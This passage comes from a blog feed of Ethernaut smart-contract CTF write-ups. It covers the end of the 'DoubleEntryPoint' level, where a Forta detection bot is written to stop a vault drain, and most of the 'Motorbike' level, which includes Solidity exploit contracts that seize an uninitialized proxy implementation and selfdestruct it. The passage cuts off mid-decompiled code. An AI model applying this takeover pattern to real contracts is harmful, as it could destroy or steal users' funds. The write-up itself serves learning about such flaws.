class=\"k\">external</span> <span class=\"k\">override</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">usersDetectionBots</span><span class=\"p\">[</span><span class=\"n\">user</span><span class=\"p\">])</span> <span class=\"o\">!=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"k\">return</span><span class=\"p\">;</span>        <span class=\"n\">botRaisedAlerts</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">CryptoVault</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">sweptTokensRecipient</span><span class=\"p\">;</span>    <span class=\"n\">IERC20</span> <span class=\"k\">public</span> <span class=\"n\">underlying</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">recipient</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">sweptTokensRecipient</span> <span class=\"o\">=</span> <span class=\"n\">recipient</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">setUnderlying</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">latestToken</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">underlying</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"s\">\"Already set\"</span><span class=\"p\">);</span>        <span class=\"n\">underlying</span> <span class=\"o\">=</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">latestToken</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"cm\">/*    ...    */</span>    <span class=\"k\">function</span> <span class=\"n\">sweepToken</span><span class=\"p\">(</span><span class=\"n\">IERC20</span> <span class=\"n\">token</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">token</span> <span class=\"o\">!=</span> <span class=\"n\">underlying</span><span class=\"p\">,</span> <span class=\"s\">\"Can't transfer underlying token\"</span><span class=\"p\">);</span>        <span class=\"n\">token</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">sweptTokensRecipient</span><span class=\"p\">,</span> <span class=\"n\">token</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">LegacyToken</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"LegacyToken\"</span><span class=\"p\">,</span> <span class=\"s\">\"LGT\"</span><span class=\"p\">),</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"n\">DelegateERC20</span> <span class=\"k\">public</span> <span class=\"n\">delegate</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">mint</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">delegateToNewContract</span><span class=\"p\">(</span><span class=\"n\">DelegateERC20</span> <span class=\"n\">newContract</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">delegate</span> <span class=\"o\">=</span> <span class=\"n\">newContract</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">override</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegate</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"n\">delegate</span><span class=\"p\">.</span><span class=\"n\">delegateTransfer</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">DoubleEntryPoint</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"DoubleEntryPointToken\"</span><span class=\"p\">,</span> <span class=\"s\">\"DET\"</span><span class=\"p\">),</span> <span class=\"n\">DelegateERC20</span><span class=\"p\">,</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">cryptoVault</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">player</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">delegatedFrom</span><span class=\"p\">;</span>    <span class=\"n\">Forta</span> <span class=\"k\">public</span> <span class=\"n\">forta</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">legacyToken</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">vaultAddress</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">fortaAddress</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">playerAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">delegatedFrom</span> <span class=\"o\">=</span> <span class=\"n\">legacyToken</span><span class=\"p\">;</span>        <span class=\"n\">forta</span> <span class=\"o\">=</span> <span class=\"n\">Forta</span><span class=\"p\">(</span><span class=\"n\">fortaAddress</span><span class=\"p\">);</span>        <span class=\"n\">player</span> <span class=\"o\">=</span> <span class=\"n\">playerAddress</span><span class=\"p\">;</span>        <span class=\"n\">cryptoVault</span> <span class=\"o\">=</span> <span class=\"n\">vaultAddress</span><span class=\"p\">;</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">cryptoVault</span><span class=\"p\">,</span> <span class=\"mi\">100</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyDelegateFrom</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">delegatedFrom</span><span class=\"p\">,</span> <span class=\"s\">\"Not legacy contract\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">fortaNotify</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"kt\">address</span> <span class=\"n\">detectionBot</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">forta</span><span class=\"p\">.</span><span class=\"n\">usersDetectionBots</span><span class=\"p\">(</span><span class=\"n\">player</span><span class=\"p\">));</span>        <span class=\"c1\">// Cache old number of bot alerts</span>        <span class=\"kt\">uint256</span> <span class=\"n\">previousValue</span> <span class=\"o\">=</span> <span class=\"n\">forta</span><span class=\"p\">.</span><span class=\"n\">botRaisedAlerts</span><span class=\"p\">(</span><span class=\"n\">detectionBot</span><span class=\"p\">);</span>        <span class=\"c1\">// Notify Forta</span>        <span class=\"n\">forta</span><span class=\"p\">.</span><span class=\"n\">notify</span><span class=\"p\">(</span><span class=\"n\">player</span><span class=\"p\">,</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"c1\">// Continue execution</span>        <span class=\"n\">_</span><span class=\"p\">;</span>        <span class=\"c1\">// Check if alarms have been raised</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">forta</span><span class=\"p\">.</span><span class=\"n\">botRaisedAlerts</span><span class=\"p\">(</span><span class=\"n\">detectionBot</span><span class=\"p\">)</span> <span class=\"o\">&gt;</span> <span class=\"n\">previousValue</span><span class=\"p\">)</span> <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"s\">\"Alert has been triggered, reverting\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">delegateTransfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">origSender</span><span class=\"p\">)</span>        <span class=\"k\">public</span>        <span class=\"k\">override</span>        <span class=\"n\">onlyDelegateFrom</span>        <span class=\"n\">fortaNotify</span>        <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span>    <span class=\"p\">{</span>        <span class=\"n\">_transfer</span><span class=\"p\">(</span><span class=\"n\">origSender</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The Forta Contract allows registering a bot to raise alerts.</p><p>The CryptoVault Contract can sweep tokens if the specific <code class=\"language-plaintext highlighter-rouge\">token</code> is not the <code class=\"language-plaintext highlighter-rouge\">underlying</code>. Additionally, the code comments in the CryptoVault Contract are empty.</p><p>The LegacyToken Contract minted <code class=\"language-plaintext highlighter-rouge\">LGT token</code> and delegated logic to the DoubleEntryPoint Contract.</p><p>The DoubleEntryPoint Contract minted <code class=\"language-plaintext highlighter-rouge\">DET token</code> and can manage transfer delegation by utilizing a forta bot.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>Inspecting the instance address on Etherscan reveals the addresses fot the LegactToken, CryptoValut and Forta Contract.</p><p>The Constructor arguments for the DoubleEntryPoint Contract are ordered as follows: LegacyToken, CryptoVault, Forta and player.</p><p><img src=\"https://0o3q.github.io/images/2026-01-19-DoubleEntryPoint/etherscan.png\" alt=\"Image etherscan\" /></p><p>To verify the address checksum, use the following command:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>cast <span class=\"nt\">--to-checksum-address</span> &lt;address&gt;</code></pre></div></div><p>We should identify the vulnerability in the <code class=\"language-plaintext highlighter-rouge\">CryptoVault</code> contract.</p><p>The <code class=\"language-plaintext highlighter-rouge\">sweepToken()</code> function is publicly callable and verifies that the requested <code class=\"language-plaintext highlighter-rouge\">token</code> is not the <code class=\"language-plaintext highlighter-rouge\">underlying</code> .</p><p>However, sweeping the LegacyToken(<code class=\"language-plaintext highlighter-rouge\">LGT token</code>) bypasses this protection.</p><p>While the function validates the <code class=\"language-plaintext highlighter-rouge\">LGT</code> address the actual transfer logic is delegated to the <code class=\"language-plaintext highlighter-rouge\">DoubleEntryPoint</code> Contract, resulting in the unintended transfer of <code class=\"language-plaintext highlighter-rouge\">DET Token</code> .</p><p>The <code class=\"language-plaintext highlighter-rouge\">notify()</code> function in the Forta Contract executes <code class=\"language-plaintext highlighter-rouge\">handleTransaction()</code>, which can be implemented with custom logic.</p><p>The <code class=\"language-plaintext highlighter-rouge\">delegateTransfer()</code> function calls include the <code class=\"language-plaintext highlighter-rouge\">origSender</code> argument. Therfore, by verifying if <code class=\"language-plaintext highlighter-rouge\">origSender</code> matches the CryptoVault address, the bot can prevent <code class=\"language-plaintext highlighter-rouge\">DET Token</code> from being drained.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/DoubleEntryPoint.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Bot</span> <span class=\"k\">is</span> <span class=\"n\">IDetectionBot</span> <span class=\"p\">{</span>    <span class=\"n\">Forta</span> <span class=\"k\">public</span> <span class=\"n\">forta_</span> <span class=\"o\">=</span> <span class=\"n\">Forta</span><span class=\"p\">(</span><span class=\"mh\">0x8d38A390959fAb2BF008bA6E49aF8Eb3D19E24d7</span><span class=\"p\">);</span>    <span class=\"n\">CryptoVault</span> <span class=\"k\">public</span> <span class=\"n\">cv_</span> <span class=\"o\">=</span> <span class=\"n\">CryptoVault</span><span class=\"p\">(</span><span class=\"mh\">0x1ee6F5EC79B4f94862B3839D7Eb661bAcf79f2e1</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">handleTransaction</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">user</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">msgData</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">override</span> <span class=\"p\">{</span>        <span class=\"p\">(,,</span> <span class=\"kt\">address</span> <span class=\"n\">origSender</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"n\">msgData</span><span class=\"p\">[</span><span class=\"mi\">4</span><span class=\"o\">:</span><span class=\"p\">],</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">));</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">origSender</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">cv_</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">forta_</span><span class=\"p\">.</span><span class=\"n\">raiseAlert</span><span class=\"p\">(</span><span class=\"n\">user</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">DoubleEntryPointSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Forta</span> <span class=\"k\">public</span> <span class=\"n\">forta_</span> <span class=\"o\">=</span> <span class=\"n\">Forta</span><span class=\"p\">(</span><span class=\"mh\">0x8d38A390959fAb2BF008bA6E49aF8Eb3D19E24d7</span><span class=\"p\">);</span>    <span class=\"n\">CryptoVault</span> <span class=\"k\">public</span> <span class=\"n\">cv_</span> <span class=\"o\">=</span> <span class=\"n\">CryptoVault</span><span class=\"p\">(</span><span class=\"mh\">0x1ee6F5EC79B4f94862B3839D7Eb661bAcf79f2e1</span><span class=\"p\">);</span>    <span class=\"n\">LegacyToken</span> <span class=\"k\">public</span> <span class=\"n\">lt_</span> <span class=\"o\">=</span> <span class=\"n\">LegacyToken</span><span class=\"p\">(</span><span class=\"mh\">0x3E847B9aE7613A08c1d8c8E52212e119903312CA</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Bot</span> <span class=\"n\">bot</span> <span class=\"o\">=</span> <span class=\"n\">Bot</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"n\">Bot</span><span class=\"p\">()));</span>        <span class=\"n\">forta_</span><span class=\"p\">.</span><span class=\"n\">setDetectionBot</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">bot</span><span class=\"p\">));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div>",
            "url": "https://0o3q.github.io/2026/01/19/doubleentrypoint",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","ERC20","DelegateERC20","Forta","double_entry_point"],
            
            "date_published": "2026-01-19T00:00:00+09:00",
            "date_modified": "2026-01-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2026/01/17/motorbike",
            "title": "[Ethernaut] 25.Motorbike",
            "summary": null,
            "content_text": "AnalysisThe goal is “selfdestruct its engine and make the motorbike unusable”.// SPDX-License-Identifier: MITpragma solidity &lt;0.7.0;import \"openzeppelin-contracts-06/utils/Address.sol\";import \"openzeppelin-contracts-06/proxy/Initializable.sol\";contract Motorbike {    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    struct AddressSlot {        address value;    }    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.    constructor(address _logic) public {        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;        (bool success,) = _logic.delegatecall(abi.encodeWithSignature(\"initialize()\"));        require(success, \"Call failed\");    }    // Delegates the current call to `implementation`.    function _delegate(address implementation) internal virtual {        // solhint-disable-next-line no-inline-assembly        assembly {            calldatacopy(0, 0, calldatasize())            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)            returndatacopy(0, 0, returndatasize())            switch result            case 0 { revert(0, returndatasize()) }            default { return(0, returndatasize()) }        }    }    // Fallback function that delegates calls to the address returned by `_implementation()`.    // Will run if no other function in the contract matches the call data    fallback() external payable virtual {        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);    }    // Returns an `AddressSlot` with member `value` located at `slot`.    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {        assembly {            r_slot := slot        }    }}contract Engine is Initializable {    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    address public upgrader;    uint256 public horsePower;    struct AddressSlot {        address value;    }    function initialize() external initializer {        horsePower = 1000;        upgrader = msg.sender;    }    // Upgrade the implementation of the proxy to `newImplementation`    // subsequently execute the function call    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {        _authorizeUpgrade();        _upgradeToAndCall(newImplementation, data);    }    // Restrict to upgrader role    function _authorizeUpgrade() internal view {        require(msg.sender == upgrader, \"Can't upgrade\");    }    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {        // Initial upgrade and setup call        _setImplementation(newImplementation);        if (data.length &gt; 0) {            (bool success,) = newImplementation.delegatecall(data);            require(success, \"Call failed\");        }    }    // Stores a new address in the EIP1967 implementation slot.    function _setImplementation(address newImplementation) private {        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");        AddressSlot storage r;        assembly {            r_slot := _IMPLEMENTATION_SLOT        }        r.value = newImplementation;    }}ExploitAttempted SolutionThe goal was to selfdestruct the Engine. Leveraging the fact that the Engine contract was uninitialized, I executed the Engine’s initialize() function to claim the upgrader role. Then, I invoked upgradeToAndCall() to trigger the self-destruct, but I was unable to solve the challenge.To understand the solution requirements, I examined the Level instance code:function 0xd38def5b(address varg0, address varg1) public nonPayable {     require(msg.data.length - 4 &gt;= 64);    return bool(!(_createInstance[varg0]).code.size);}I found the validateInstance() function, which is executed when submitting the instance.Checks if the Engine contract’s code.size is 0.💡Warning (5159): \"selfdestruct\" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.This is the warning message displayed in Foundry when executing selfdestruct.As indicated by the warning, there is an exception when the operation is executed within a transaction. I leveraged this exception to solve the challenge.First, I deployed an Ex Contract containing a selfdestruct function to be delegated to the Engine. Exploiting the fact that the Engine Contract was uninitialized, I claimed the upgrader role. Finally, I used upgradeToAndCall() to delegate execution to the Ex Contract, triggering the selfdestruct.Deploying the Assist Contractcontract Ex {    function ex() public {        selfdestruct(payable(tx.origin));    }}contract Sol {    function solve(Ethernaut ethernaut, address level, address _eg) public {        ethernaut.createLevelInstance(Level(level));        Engine(_eg).initialize();        Engine(_eg).upgradeToAndCall(address(new Ex()), abi.encodeWithSignature(\"ex()\"));    }}ethernaut.createLevelInstance(Level(level)) is the function that runs when you click the “Get new instance” button on Ethernaut. You can check the full details here.    function createLevelInstance(Level _level) public payable {        // Ensure level is registered.        require(registeredLevels[address(_level)], \"This level doesn't exists\");        // Get level factory to create an instance.        address instance = _level.createInstance{value: msg.value}(msg.sender);        // Store emitted instance relationship with player and level.        emittedInstances[instance] = EmittedInstanceData(            msg.sender,            _level,            false        );        statistics.createNewInstance(instance, address(_level), msg.sender);        // Retrieve created instance via logs.        emit LevelInstanceCreatedLog(msg.sender, instance, address(_level));    }Delegating to the Sol contractSol sol = new Sol();uint256 pk = uint256(vm.parseBytes32(vm.promptSecret(\"private key\")));vm.signAndAttachDelegation(address(sol), pk);After deploying the Sol contract, I executed the signAndAttachDelegation() function using the private key.The signAndAttachDelegation() function utilizes EIP-7702 features to sign an authorization, allowing the contract to be delegated to a wallet address.I used this function specifically to address the requirements of submitLevelInstance().    function submitLevelInstance(address payable _instance) public {        // Get player and level.        EmittedInstanceData storage data = emittedInstances[_instance];        require(            data.player == msg.sender,            \"This instance doesn't belong to the current user\"        ); // instance was emitted for this player        require(data.completed == false, \"Level has been completed already\"); // not already submitted        // Have the level check the instance.        if (data.level.validateInstance(_instance, msg.sender)) {            // Register instance as completed.            data.completed = true;            statistics.submitSuccess(                _instance,                address(data.level),                msg.sender            );            // Notify success via logs.            emit LevelCompletedLog(msg.sender, _instance, address(data.level));        } else {            statistics.submitFailure(                _instance,                address(data.level),                msg.sender            );        }    }The submitLevelInstance() function, which is executed when the “Submit instance” button is clicked, retrieves emittedInstances[_instance] to verify if the instance was registered by msg.sender.This results in a failure when attempting to submit the solution to the Ethernaut site.Obtaining the Motorbike and Engine Contract addressesThe following outlines the process of determining the Motorbike and Engine Contract addresses.Although the goal is to reduce the Engine Contract’s code size to 0, the createLevelInstance() function:    function createLevelInstance(Level _level) public payable {        // Ensure level is registered.        require(registeredLevels[address(_level)], \"This level doesn't exists\");        // Get level factory to create an instance.        address instance = _level.createInstance{value: msg.value}(msg.sender);        // Store emitted instance relationship with player and level.        emittedInstances[instance] = EmittedInstanceData(            msg.sender,            _level,            false        );        statistics.createNewInstance(instance, address(_level), msg.sender);        // Retrieve created instance via logs.        emit LevelInstanceCreatedLog(msg.sender, instance, address(_level));    }does not return any values. Furthermore, since the exploit must occur within a single transaction, event logs are inaccessible, making it necessary to manually calculate the contract addresses.As observed in the challenge and Level instance code:// Decompiled by library.dedaub.com// 2026.01.17 06:27 UTC// Compiled using the solidity compiler version 0.6.12// Data structures and variables inferred from the use of storage instructionsmapping (address =&gt; address) _createInstance; // STORAGE[0x1]address _owner; // STORAGE[0x0] bytes 0 to 19// EventsOwnershipTransferred(address, address);function transferOwnership(address newOwner) public nonPayable {     require(msg.data.length - 4 &gt;= 32);    require(_owner == msg.sender, Error('Ownable: caller is not the owner'));    require(newOwner, Error('Ownable: new owner is the zero address'));    emit OwnershipTransferred(_owner, newOwner);    _owner = newOwner;}function fallback() public payable {     revert();}function renounceOwnership() public nonPayable {     require(_owner == msg.sender, Error('Ownable: caller is not the owner'));    emit OwnershipTransferred(_owner, 0);    _owner = 0;}function createInstance(address _hub) public payable {     require(msg.data.length - 4 &gt;= 32);    MEM[v220V0x8c.data:v220V0x8c.data + 1353] = 0x608060405234801561001057600080fd5b50610529806100206000396000f3fe60806040526004361061003f5760003560e01c80634f1ef28614610044578063564f6d71146100fc5780638129fc1c14610123578063af26974514610138575b600080fd5b6100fa6004803603604081101561005a57600080fd5b6001600160a01b03823516919081019060408101602082013564010000000081111561008557600080fd5b82018360208201111561009757600080fd5b803590602001918460018302840111640100000000831117156100b957600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550610169945050505050565b005b34801561010857600080fd5b5061011161017f565b60408051918252519081900360200190f35b34801561012f57600080fd5b506100fa610185565b34801561014457600080fd5b5061014d61025c565b604080516001600160a01b039092168252519081900360200190f35b610171610271565b61017b82826102d8565b5050565b60015481565b600054610100900460ff168061019e575061019e6103e4565b806101ac575060005460ff16155b6101e75760405162461bcd60e51b815260040180806020018281038252602e815260200180610499602e913960400191505060405180910390fd5b600054610100900460ff16158015610212576000805460ff1961ff0019909116610100171660011790555b6103e8600155600080547fffffffffffffffffffff0000000000000000000000000000000000000000ffff163362010000021790558015610259576000805461ff00191690555b50565b6000546201000090046001600160a01b031681565b6000546201000090046001600160a01b031633146102d6576040805162461bcd60e51b815260206004820152600d60248201527f43616e2774207570677261646500000000000000000000000000000000000000604482015290519081900360640190fd5b565b6102e1826103f5565b80511561017b576000826001600160a01b0316826040518082805190602001908083835b602083106103245780518252601f199092019160209182019101610305565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610384576040519150601f19603f3d011682016040523d82523d6000602084013e610389565b606091505b50509050806103df576040805162461bcd60e51b815260206004820152600b60248201527f43616c6c206661696c6564000000000000000000000000000000000000000000604482015290519081900360640190fd5b505050565b60006103ef30610492565b15905090565b6103fe81610492565b6104395760405162461bcd60e51b815260040180806020018281038252602d8152602001806104c7602d913960400191505060405180910390fd5b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc80547fffffffffffffffffffffffff0000000000000000000000000000000000000000166001600160a01b0392909216919091179055565b3b15159056fe496e697469616c697a61626c653a20636f6e747261637420697320616c726561647920696e697469616c697a6564455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374a264697066735822122007424dee2c3970da4b44a842c5d8a06a97751da3c8c268eeecaa2569e32a9f3964736f6c634300060c0033;    v0 = create.code(v1.data, 1353).value(0);    if (bool(v0)) {        MEM[v24eV0x8c.data:v24eV0x8c.data + 705] = 0x608060405234801561001057600080fd5b506040516102c13803806102c18339818101604052602081101561003357600080fd5b5051610049816101d1602090811b61007017901c565b6100845760405162461bcd60e51b815260040180806020018281038252602d815260200180610294602d913960400191505060405180910390fd5b806100ae7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc6101d7565b80546001600160a01b039283166001600160a01b031990911617905560408051600481526024810182526020810180516001600160e01b031663204a7f0760e21b1781529151815160009486169382918083835b602083106101215780518252601f199092019160209182019101610102565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610181576040519150601f19603f3d011682016040523d82523d6000602084013e610186565b606091505b50509050806101ca576040805162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b604482015290519081900360640190fd5b50506101da565b3b151590565b90565b60ac806101e86000396000f3fe60806040526048602d7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc604a565b5473ffffffffffffffffffffffffffffffffffffffff16604d565b005b90565b3660008037600080366000845af43d6000803e808015606b573d6000f35b3d6000fd5b3b15159056fea2646970667358221220ca7b336654cd29640f3df95da5dc17f0facf369b8d4692675b71665674d682be64736f6c634300060c0033455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374;        v2 = create.code(v3.data, 737).value(0);        if (bool(v2)) {            _createInstance[address(v2)] = v0;            if (this.balance &gt;= 0) {                if (bool(v2.code.size)) {                    v4 = 